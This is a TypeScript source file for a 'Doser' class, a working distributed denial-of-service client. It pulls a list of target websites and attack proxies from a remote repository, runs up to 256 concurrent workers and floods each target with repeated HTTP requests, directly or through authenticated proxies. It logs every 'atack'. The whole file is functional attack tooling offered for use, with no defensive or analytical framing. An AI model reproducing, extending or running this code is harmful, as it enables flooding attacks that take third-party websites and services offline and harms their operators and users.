import axios, { AxiosError } from 'axios-https-proxy-fix'
import { EventEmitter } from 'events'
// import {date} from "quasar";

interface ProxyData {
  auth: string
  id: number
  ip: string
}

interface SiteData {
  atack: number
  id: number
  need_parse_url: number
  page: string
  page_time: number
  url: string
}

interface TargetData {
  site: SiteData
  proxy: Array<ProxyData>
}

export type DoserEventType = 'atack' | 'error'

export class Doser {
  private onlyProxy: boolean
  private hosts: Array<string> = []
  private working: boolean
  private workers: number
  private eventSource: EventEmitter
  private ATACKS_PER_TARGET = 64;

  private loadedTargetsAndProxies: any | null;
  private loadingDataInterval;

  private workerActive: Array<boolean>

  constructor (onlyProxy: boolean, workers: number) {
    this.onlyProxy = onlyProxy
    this.working = false
    this.workers = workers
    this.eventSource = new EventEmitter()
    this.workerActive = new Array<boolean>(256)
    this.workerActive.fill(false);

    //Initialize data
    this.updateTargetsAndProxies();

    // Update data repeatedly
    this.loadingDataInterval = setInterval(() => {
      this.updateTargetsAndProxies();
    }, 300000)
  }

  private updateTargetsAndProxies() {
    this.getSitesAndProxies()
      .then(data => {
        this.loadedTargetsAndProxies = data
      })
      .catch(() => console.log('Unable to update data'))
  }

  forceProxy (newVal: boolean) {
    this.onlyProxy = newVal
  }

  async getSitesAndProxies () {
    try {
      console.log('Loading targets and proxies;')
      const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
      const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
      // https://www.wikipedia.org/
      if (sitesResponse.status === 200 && proxyResponse.status === 200) {
        const sites = sitesResponse.data as Array<SiteData>
        const proxyes = proxyResponse.data as Array<ProxyData>

        console.log('Targets and proxies were loaded;')
        return {
          sites,
          proxyes
        }
      }
    } catch (e) {
      console.log('Error while loading hosts and proxies: ', e)
      return null
    }
    return null
  }

  start () {
    this.working = true
    this.setWorkersCount(this.workers)
    for (let i = 0; i < 256; i++) {
      const setI = i
      setImmediate(() => void this.worker.bind(this)(setI))
    }
  }

  setWorkersCount (newCount: number) {
    this.workers = newCount
    for (let wIndex = 0; wIndex < 256; wIndex++) {
      this.workerActive[wIndex] = (wIndex < newCount)
    }
  }

  stop () {
    this.working = false
  }

  listen (event: DoserEventType, callback: (data: any)=>void) {
    this.eventSource.addListener(event, callback)
  }

  private async worker (workerIndex: number) {
    while (this.working) {
      //What until worker enabled and data loaded
      if (!this.workerActive[workerIndex] || this.loadedTargetsAndProxies == null) {
        await new Promise(resolve => setTimeout(resolve, 1000))
        continue
      }

      const target = {
        site: this.loadedTargetsAndProxies.sites[Math.floor(Math.random() * this.loadedTargetsAndProxies.sites.length)],
        proxy: this.loadedTargetsAndProxies.proxyes
      } as TargetData

      // check if direct request can be performed
      let directRequest = false
      if (!this.onlyProxy) {
        try {
          const response = await axios.get(target.site.page, { timeout: 10000 })
          directRequest = response.status === 200
        } catch (e) {
          this.eventSource.emit('error', { type: 'error', error: e })
          directRequest = false
        }
      }

      let proxy = null
      for (let atackIndex = 0; (atackIndex < this.ATACKS_PER_TARGET) && this.working; atackIndex++) {
        try {
          if (directRequest) {
            const r = await axios.get(target.site.page, { timeout: 5000, validateStatus: () => true })
            this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
          } else {
            if (proxy === null) {
              proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
            }
            const proxyAddressSplit = proxy.ip.split(':')
            const proxyIP = proxyAddressSplit[0]
            const proxyPort = parseInt(proxyAddressSplit[1])
            const proxyAuthSplit = proxy.auth.split(':')
            const proxyUsername = proxyAuthSplit[0]
            const proxyPassword = proxyAuthSplit[1]

            const r = await axios.get(target.site.page, {
              timeout: 10000,
              validateStatus: () => true,
              proxy: {
                host: proxyIP,
                port: proxyPort,
                auth: {
                  username: proxyUsername,
                  password: proxyPassword
                }
              }
            })

            this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | PROXY | ${r.status} | ${target.site.page_time} ms` })

            if (r.status === 407) {
              console.log('Proxy requires auth: ', proxy)
              proxy = null
            }
          }
        } catch (e) {
          proxy = null
          let code = (e as AxiosError).code
          if (code === undefined) {
            console.log('Unknown error: ', e)
            code = 'UNKNOWN'
          }
          this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
          if (code === 'ECONNABORTED') {
            break
          }
        }
      }
    }

    console.log('Worker finished its work: ', workerIndex);
  }
}
